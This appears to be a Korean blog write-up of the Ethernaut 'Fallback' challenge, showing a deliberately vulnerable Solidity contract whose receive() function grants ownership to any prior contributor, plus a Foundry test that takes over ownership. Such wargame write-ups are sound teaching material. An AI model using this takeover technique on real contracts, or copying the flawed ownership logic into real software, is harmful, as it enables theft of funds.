---
title: "Ethernaut Fallback"
date : 2026-11-14 00:00:00 +0900
categories: [Blockchain Security, Ethernaut ]
tags: [solidity, smart-contract, access-control, fallback, foundry]
---


## Fallback 

Fallback 코드 :

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}


```

목표는 owner 가 msg.sender가 되게하는거다.

constructor()로 처음에 owner = msg.sender(최초 배포자)로 설정하고 contributions[msg.sender] = 1000 * (1 ether)값으로 설정된다.


## 분석

contribute 함수를 보면 msg.value가 0.001ether 이하일떄만 통과 가능하고 contributions[msg.sender]+=msg.value로 값을 추가해준다.

그 다음 조건문 검사에서 기존 owner보다 이 값이 커지면 owner를 변경해주는데 이걸 통과하려면 전송을 100만번 넘게 해야한다..

아레에보면 receive() 함수가있다.
조건문을 보면 require(msg.value > 0 && contributions[msg.sender] > 0) 으로 그냥 넘겨주는 msg.value 값이랑 현재 컨트랙트를 실행시키는 사용자 contributions[msg.sender]값이 0 보다 크기만 하면된다.

## exploit

contributions에 한번 전송해서(0.001 밑으로) 값을 채운뒤 그냥 아무값이나 value에넣어서 전송하면 external payable때문데 reveive()가 호출된다.

```solidity

// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol"; //Foundry test 도구 
import "../src/Fallback.sol"; //공격대상 가져오기

contract FallbackTest is Test {
    Fallback target;
    address attacker = makeAddr("attacker");

    function setUp() public{
        target = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function test_takeOwnership() public{
        vm.startPrank(attacker);
        //1
        target.contribute{value: 0.0005 ether}();
        //2
        (bool ok, ) = address(target).call{value: 0.001 ether}("");
        require(ok);
        //3
        assertEq(target.owner(), attacker);
        vm.stopPrank();

    }
}

```